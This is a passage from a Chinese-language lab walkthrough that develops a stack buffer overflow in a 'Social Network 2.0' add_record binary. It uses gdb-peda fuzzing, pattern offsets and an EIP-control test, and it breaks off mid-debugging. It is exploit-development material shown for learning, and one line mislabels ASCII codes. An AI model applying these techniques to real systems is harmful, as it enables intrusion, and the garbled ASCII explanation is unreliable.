AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Years worked(<span class="type">int</span>): Salary(<span class="type">int</span>): Ever got <span class="keyword">in</span> trouble? <span class="number">1</span> (yes) <span class="keyword">or</span> <span class="number">0</span> (<span class="keyword">no</span>): Employee data you<span class="string">&#x27;ve entered:</span></span><br><span class="line"><span class="string">Name AAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">Years -136196023, Salary -8493, Trouble 8, Comments NA</span></span><br><span class="line"><span class="string">[Inferior 1 (process 17994) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running or target is remot</span></span><br></pre></td></tr></table></figure>

<p>直接退出了，正常退出，所以应该不存在溢出漏洞。</p>
<p>测试<code>Years worked(int)</code>也不存在</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">r</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">Welcome <span class="keyword">to</span> <span class="keyword">Add</span> <span class="type">Record</span> application</span><br><span class="line">Use it <span class="keyword">to</span> <span class="keyword">add</span> <span class="keyword">info</span> about Social Network <span class="number">2.0</span> Employees</span><br><span class="line">Employee <span class="type">Name</span>(<span class="type">char</span>): a</span><br><span class="line">a</span><br><span class="line">Years worked(<span class="type">int</span>): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Salary(<span class="type">int</span>): Ever got <span class="keyword">in</span> trouble? <span class="number">1</span> (yes) <span class="keyword">or</span> <span class="number">0</span> (<span class="keyword">no</span>): Employee data you<span class="string">&#x27;ve entered:</span></span><br><span class="line"><span class="string">Name a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Years -136196023, Salary -8493, Trouble 8, Comments NA</span></span><br><span class="line"><span class="string">[Inferior 1 (process 18105) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running or target is remote</span></span><br></pre></td></tr></table></figure>



<p>继续测试，发现Explain存在内存溢出</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ r</span><br><span class="line"><span class="attribute">r</span></span><br><span class="line"><span class="attribute">Starting</span> program: /home/socnet/add_record</span><br><span class="line"><span class="attribute">Welcome</span> to Add Record application</span><br><span class="line"><span class="attribute">Use</span> it to add info about Social Network <span class="number">2</span>.<span class="number">0</span> Employees</span><br><span class="line"><span class="attribute">Employee</span> Name(char): a</span><br><span class="line"><span class="attribute">a</span></span><br><span class="line"><span class="attribute">Years</span> worked(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Salary</span>(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Ever</span> got in trouble? <span class="number">1</span> (yes) or <span class="number">0</span> (no): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Explain</span>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"><span class="attribute">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Program</span> received signal SIGSEGV, Segmentation fault.<span class="meta"></span></span><br><span class="line"><span class="meta">[----------------------------------registers-----------------------------------]</span></span><br><span class="line"><span class="attribute">EAX</span>: <span class="number">0</span>xffffdc<span class="number">0</span>e (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">EBX</span>: <span class="number">0</span>x<span class="number">41414141</span> (&#x27;AAAA&#x27;)</span><br><span class="line"><span class="attribute">ECX</span>: <span class="number">0</span>xffffde<span class="number">60</span> --&gt; <span class="number">0</span>x<span class="number">0</span></span><br><span class="line"><span class="attribute">EDX</span>: <span class="number">0</span>xffffde<span class="number">02</span> --&gt; <span class="number">0</span>x<span class="number">41414100</span> (&#x27;&#x27;)</span><br><span class="line"><span class="attribute">ESI</span>: <span class="number">0</span>xf<span class="number">7</span>fc<span class="number">2000</span> --&gt; <span class="number">0</span>x<span class="number">1</span>d<span class="number">4</span>d<span class="number">6</span>c</span><br><span class="line"><span class="attribute">EDI</span>: <span class="number">0</span>xffffdcd<span class="number">0</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">EBP</span>: <span class="number">0</span>x<span class="number">41414141</span> (&#x27;AAAA&#x27;)</span><br><span class="line"><span class="attribute">ESP</span>: <span class="number">0</span>xffffdc<span class="number">50</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">EIP</span>: <span class="number">0</span>x<span class="number">41414141</span> (&#x27;AAAA&#x27;)</span><br><span class="line"><span class="attribute">EFLAGS</span>: <span class="number">0</span>x<span class="number">10286</span> (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<span class="meta"></span></span><br><span class="line"><span class="meta">[-------------------------------------code-------------------------------------]</span></span><br><span class="line"><span class="attribute">Invalid</span> $PC address: <span class="number">0</span>x<span class="number">41414141</span><span class="meta"></span></span><br><span class="line"><span class="meta">[------------------------------------stack-------------------------------------]</span></span><br><span class="line"><span class="attribute">0000</span>| <span class="number">0</span>xffffdc<span class="number">50</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0004</span>| <span class="number">0</span>xffffdc<span class="number">54</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0008</span>| <span class="number">0</span>xffffdc<span class="number">58</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0012</span>| <span class="number">0</span>xffffdc<span class="number">5</span>c (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0016</span>| <span class="number">0</span>xffffdc<span class="number">60</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0020</span>| <span class="number">0</span>xffffdc<span class="number">64</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0024</span>| <span class="number">0</span>xffffdc<span class="number">68</span> (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)</span><br><span class="line"><span class="attribute">0028</span>| <span class="number">0</span>xffffdc<span class="number">6</span>c (&#x27;A&#x27; &lt;repeats <span class="number">200</span> times&gt;...)<span class="meta"></span></span><br><span class="line"><span class="meta">[------------------------------------------------------------------------------]</span></span><br><span class="line"><span class="attribute">Legend</span>: code, data, rodata, value</span><br><span class="line"><span class="attribute">Stopped</span> reason: SIGSEGV</span><br><span class="line"><span class="attribute">0x41414141</span> in ?? (</span><br></pre></td></tr></table></figure>

<p>缓冲区溢出需要重点关注EIP这个寄存器（<code>EIP: 0x41414141 (&#39;AAAA&#39;)</code> ）。EIP保存的数值是CPU接下来需要执行指令的内存地址编号。我们需要确定EIP中的4个A究竟是哪4个A。将这四个A替换成payload的内存地址，就可以执行payload。</p>
<h3 id="gdb特征字符"><a href="#gdb特征字符" class="headerlink" title="gdb特征字符"></a>gdb特征字符</h3><p>通过修改AAA的数量，确定字符小于100也能造成缓冲区溢出。</p>
<p>通过gdb生成特征字符（每四个字符都不一样）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb<span class="operator">-</span>peda$ <span class="keyword">pattern</span> <span class="keyword">create</span> <span class="number">100</span></span><br><span class="line"><span class="keyword">pattern</span> <span class="keyword">create</span> <span class="number">100</span></span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#x27;</span></span><br></pre></td></tr></table></figure>

<p>放置到Explain里面执行</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ r</span><br><span class="line"><span class="attribute">r</span></span><br><span class="line"><span class="attribute">Starting</span> program: /home/socnet/add_record</span><br><span class="line"><span class="attribute">Welcome</span> to Add Record application</span><br><span class="line"><span class="attribute">Use</span> it to add info about Social Network <span class="number">2</span>.<span class="number">0</span> Employees</span><br><span class="line"><span class="attribute">Employee</span> Name(char): a</span><br><span class="line"><span class="attribute">a</span></span><br><span class="line"><span class="attribute">Years</span> worked(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Salary</span>(int): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Ever</span> got in trouble? <span class="number">1</span> (yes) or <span class="number">0</span> (no): <span class="number">1</span></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">Explain</span>: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA<span class="number">0</span>AAFAAbAA<span class="number">1</span>AAGAAcAA<span class="number">2</span>AAHAAdAA<span class="number">3</span>AAIAAeAA<span class="number">4</span>AAJAAfAA<span class="number">5</span>AAKAAgAA<span class="number">6</span>AAL</span><br><span class="line"><span class="attribute">AAA</span>%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA<span class="number">0</span>AAFAAbAA<span class="number">1</span>AAGAAcAA<span class="number">2</span>AAHAAdAA<span class="number">3</span>AAIAAeAA<span class="number">4</span>AAJAAfAA<span class="number">5</span>AAKAAgAA<span class="number">6</span>AAL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">EIP</span>: <span class="number">0</span>x<span class="number">41414841</span> (&#x27;AHAA&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attribute">0x41414841</span> in ?? ()</span><br></pre></td></tr></table></figure>

<p>EIP的结果是<code>EIP: 0x41414841 (&#39;AHAA&#39;)</code></p>
<h3 id="使用gdb-patter-search"><a href="#使用gdb-patter-search" class="headerlink" title="使用gdb patter search"></a>使用gdb patter search</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern search</span><br><span class="line">pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line"><span class="built_in">EBX</span>+<span class="number">0</span> found <span class="meta">at</span> offset: <span class="number">54</span></span><br><span class="line"><span class="built_in">EBP</span>+<span class="number">0</span> found <span class="meta">at</span> offset: <span class="number">58</span></span><br><span class="line"><span class="built_in">EIP</span>+<span class="number">0</span> found <span class="meta">at</span> offset: <span class="number">62</span></span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[<span class="built_in">EAX</span>] --&gt; offset <span class="number">0</span> - size ~<span class="number">100</span></span><br><span class="line">[<span class="built_in">ESP</span>] --&gt; offset <span class="number">66</span> - size ~<span class="number">34</span></span><br><span class="line">Pattern buffer found <span class="meta">at</span>:</span><br><span class="line"><span class="number">0x0804a6d0</span> : offset    <span class="number">0</span> - size  <span class="number">100</span> ([heap])</span><br><span class="line"><span class="number">0xffffdc0e</span> : offset    <span class="number">0</span> - size  <span class="number">100</span> ($<span class="built_in">sp</span> + -<span class="number">0x42</span> [-<span class="number">17</span> dwords])</span><br><span class="line"><span class="number">0xffffdc73</span> : offset    <span class="number">7</span> - size   <span class="number">93</span> ($<span class="built_in">sp</span> + <span class="number">0x23</span> [<span class="number">8</span> dwords])</span><br><span class="line">References to pattern buffer found <span class="meta">at</span>:</span><br><span class="line"><span class="number">0xf7fc25cc</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25d0</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25d4</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25d8</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xf7fc25dc</span> : <span class="number">0x0804a6d0</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br><span class="line"><span class="number">0xffffd558</span> : <span class="number">0x0804a6d0</span> ($<span class="built_in">sp</span> + -<span class="number">0x6f8</span> [-<span class="number">446</span> dwords])</span><br><span class="line"><span class="number">0xffffdbd8</span> : <span class="number">0xffffdc0e</span> ($<span class="built_in">sp</span> + -<span class="number">0x78</span> [-<span class="number">30</span> dwords])</span><br><span class="line"><span class="number">0xffffdbf0</span> : <span class="number">0xffffdc0e</span> ($<span class="built_in">sp</span> + -<span class="number">0x60</span> [-<span class="number">24</span> dwords])</span><br><span class="line"><span class="number">0xf7ea0037</span> : <span class="number">0xffffdc73</span> (/lib32/libc-<span class="number">2.27</span><span class="number">.</span>so)</span><br></pre></td></tr></table></figure>

<p>重点关注<code>EIP+0 found at offset: 62</code>，他的偏移量是62，也就是说从63个字符开始，就会进入EIP寄存器中。</p>
<p>按照推断，我们生成62个A，再加上4个其他字符，那边EIP就是我们指定的4个字符了</p>
<p>还是使用python生成：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> ~]<span class="meta"># python -c <span class="string">&quot;print(&#x27;A&#x27;*62 + &#x27;BCDE&#x27;)&quot;</span></span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE</span><br></pre></td></tr></table></figure>



<p>gdb执行</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">Welcome to Add Record application</span><br><span class="line">Use it to add info about Social Network 2.0 Employees</span><br><span class="line">Employee Name(char): 1</span><br><span class="line">1</span><br><span class="line"><span class="code">......</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">EIP: 0x45444342 (&#x27;BCDE&#x27;)</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">......</span></span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line"></span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>



<p>验证猜想成功，就是BCDE。</p>
<p><code>EIP: 0x45444342 (&#39;BCDE&#39;)</code></p>
<p>42表示B的ASCII编码，43表示D，44表示C，45表示B。</p>
<h3 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h3><p>查看main函数的汇编指令。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas main</span><br><span class="line">disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   <span class="number">0x080486d8</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">esp</span>+<span class="number">0x4</span>]</span><br><span class="line">.....</span><br><span class="line">   <span class="number">0x08048729</span> &lt;+<span class="number">81</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048520</span> &lt;fopen@plt&gt;</span><br><span class="line">......</span><br><span class="line">   <span class="number">0x0804873d</span> &lt;+<span class="number">101</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x0804873e</span> &lt;+<span class="number">102</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484e0</span> &lt;puts@plt&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>其中call，是调用函数fopen, @plt是指c语言内建函数。</p>
<p>puts是函数一般输出一些内容，通过Printf的内建函数输出结果。为了验证猜测，我们可以在put函数之前<code>0x0804873d</code>打个断点。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gdb</span>-peda$ break *<span class="number">0</span>x<span class="number">0804873</span>d</span><br><span class="line"><span class="attribute">break</span> *<span class="number">0</span>x<span class="number">0804873</span>d</span><br><span class="line"><span class="attribute">Breakpoint</span> <span class="number">1</span> at <span class="number">0</span>x<span class="number">804873</span>d</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ run</span><br><span class="line">run</span><br><span class="line">Starting program: /home/socnet/add_record</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line"><span class="symbol">EAX:</span> <span class="number">0x8048974</span> (<span class="string">&quot;Welcome to Add Record application\nUse it to add info about Social Network 2.0 Employees&quot;</span>)</span><br><span class="line"><span class="symbol">EBX:</span> <span class="number">0x8049d48</span> --&gt; <span class="number">0x8049c58</span> --&gt; <span class="number">0x1</span></span><br><span class="line"><span class="symbol">ECX:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">EDX:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">ESI:</span> <span class="number">0xf7fc2000</span> --&gt; <span class="number">0x1d4d6c</span></span><br><span class="line"><span class="symbol">EDI:</span> <span class="number">0xffffdcd0</span> --&gt; <span class="number">0x8</span></span><br><span class="line"><span class="symbol">EBP:</span> <span class="number">0xffffdd18</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="symbol">ESP:</span> <span class="number">0xffffdc54</span> --&gt; <span class="number">0x804895a</span> --&gt; <span class="number">0x6d650061</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="symbol">EIP:</span> <span class="number">0x804873d</span> (&lt;main+<span class="number">101</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span>)</span><br><span class="line"><span class="symbol">EFLAGS:</span> <span class="number">0x292</span> (carry parity ADJUST <span class="meta">zero</span> SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x8048731</span> &lt;main+<span class="number">89</span>&gt;:	<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x1c</span>],<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x8048734</span> &lt;main+<span class="number">92</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x8048737</span> &lt;main+<span class="number">95</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x13d4</span>]</span><br><span class="line">=&gt; <span class="number">0x804873d</span> &lt;main+<span class="number">101</span>&gt;:	<span class="keyword">push</span>   <span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x804873e</span> &lt;main+<span class="number">102</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x80484e0</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x8048743</span> &lt;main+<span class="number">107</span>&gt;:	<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">   <span class="number">0x8048746</span> &lt;main+<span class="number">110</span>&gt;:	<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0xc</span></span><br><span class="line">   <span class="number">0x8048749</span> &lt;main+<span class="number">113</span>&gt;:	<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebx</span>-<span class="number">0x137c</span>]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0xffffdc54</span> --&gt; <span class="number">0x804895a</span> --&gt; <span class="number">0x6d650061</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="number">0004</span>| <span class="number">0xffffdc58</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0008</span>| <span class="number">0xffffdc5c</span> --&gt; <span class="number">0x80486f4</span> (&lt;main+<span class="number">28</span>&gt;:	<span class="keyword">add</span>    <span 